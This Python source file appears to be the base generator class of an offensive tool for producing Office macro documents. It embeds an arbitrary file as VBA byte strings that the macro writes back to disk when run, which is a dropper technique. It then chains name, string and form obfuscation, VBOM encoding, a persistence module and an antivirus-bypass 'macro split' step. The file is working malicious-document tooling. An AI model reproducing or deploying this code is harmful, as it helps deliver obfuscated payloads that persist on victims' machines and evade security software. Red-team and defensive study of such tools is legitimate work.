import os
from vbLib import WriteBytes
from modules.obfuscate_names import ObfuscateNames
from modules.obfuscate_form import ObfuscateForm
from modules.obfuscate_strings import ObfuscateStrings
try:
    from pro_modules.vbom_encode import VbomEncoder
    from pro_modules.persistance import Persistance
    from pro_modules.av_bypass import AvBypass
except:
    pass
from modules.mp_module import MpModule
import logging

class Generator(MpModule):
    """ Class for modules which are used to generate a file """
    
    def __init__(self,mpSession):
        self.embeddedFilePath = mpSession.embeddedFilePath
        super().__init__(mpSession)    
    
    
        
    def embedFile(self):
        """
        Embed the content of  self.embeddedFilePath inside the generated target file
        """
        logging.info("   [-] Embedding file %s..." % self.embeddedFilePath)
        if not os.path.isfile(self.embeddedFilePath):
            logging.warning("   [!] Could not find %s! " % self.embeddedFilePath)
            return
        
        infile = open(self.embeddedFilePath, 'rb')
        packedFile = ""
        
        countLine = 0
        countSubs = 1
        line = ""
        packedFile += "Sub DumpFile%d(objFile) \n" % countSubs
            
        while True:
            inbyte = infile.read(1)
            if not inbyte:
                break
            if len(line) > 0:
                line = line + " "
            line = line + "%d" % ord(inbyte)
            if len(line) > 800:
                packedFile += "\tWriteBytes objFile, \"%s\" \n" % line
                line = ""
                countLine += 1
                if countLine > 99:
                    countLine = 0
                    packedFile += "End Sub \n"
                    packedFile += " \n"
                    countSubs += 1
                    packedFile += "Sub DumpFile%d(objFile) \n" % countSubs
                     
        if len(line) > 0:
            packedFile += "\tWriteBytes objFile, \"%s\" \n" % line
            
        packedFile += "End Sub \n"
        packedFile += " \n"
        packedFile += "Sub DumpFile(strFilename) \n"
        packedFile += "\tDim objFSO \n"
        packedFile += "\tDim objFile \n"
        packedFile += " \n"
        packedFile += "\tSet objFSO = CreateObject(\"Scripting.FileSystemObject\") \n"
        packedFile += "\tSet objFile = objFSO.OpenTextFile(strFilename, 2, true) \n"
        for iIter in range(1, countSubs+1):
            packedFile += "\tDumpFile%d objFile \n" % iIter
        packedFile += "\tobjFile.Close \n"
        packedFile += "End Sub \n"
    
        newContent = WriteBytes.VBA + "\n"
        newContent += packedFile + "\n"       
        self.addVBAModule(newContent)
        
        infile.close()
        return 
    
    
    def generate(self):
        """ Generate the targeted file """
        raise NotImplementedError
    
    def check(self):
        """ Verify generation feasability return true if ok, false if not"""
        
        raise NotImplementedError
        
    
    def runObfuscators(self):
        """ Call this method whenever you need to obfuscate the content of temp directory """
        # Macro obfuscation
        if self.mpSession.obfuscateNames:
            obfuscator = ObfuscateNames(self.mpSession)
            obfuscator.run()
        # Mask strings
        if self.mpSession.obfuscateStrings:
            obfuscator = ObfuscateStrings(self.mpSession)
            obfuscator.run()
        # Macro obfuscation
        if self.mpSession.obfuscateForm:
            obfuscator = ObfuscateForm(self.mpSession)
            obfuscator.run() 
        if self.mpSession.mpType == "Pro":
                
            # MAcro encoding    
            if self.mpSession.vbomEncode:
                obfuscator = VbomEncoder(self.mpSession)
                obfuscator.run() 
                
                # PErsistance management
                if self.mpSession.persist:
                    obfuscator = Persistance(self.mpSession)
                    obfuscator.run() 
                
                # Macro obfuscation second round
                if self.mpSession.obfuscateNames:
                    obfuscator = ObfuscateNames(self.mpSession)
                    obfuscator.run()
                # Mask strings
                if self.mpSession.obfuscateStrings:
                    obfuscator = ObfuscateStrings(self.mpSession)
                    obfuscator.run()
                # Macro obfuscation
                if self.mpSession.obfuscateForm:
                    obfuscator = ObfuscateForm(self.mpSession)
                    obfuscator.run() 
            else:
                # PErsistance management
                if self.mpSession.persist:
                    obfuscator = Persistance(self.mpSession)
                    obfuscator.run() 
            
            #macro split
            if self.mpSession.avBypass:
                obfuscator = AvBypass(self.mpSession)
                obfuscator.run() 
    
    
    def run(self):
        logging.info(" [+] Prepare %s file generation..." % self.outputFileType)
        # Check feasability
        if not self.check():
            return
        # embed a file if asked
        if self.embeddedFilePath:
            self.embedFile()
        # Obfuscate VBA files
        self.runObfuscators()
        # generate
        self.generate()
        
        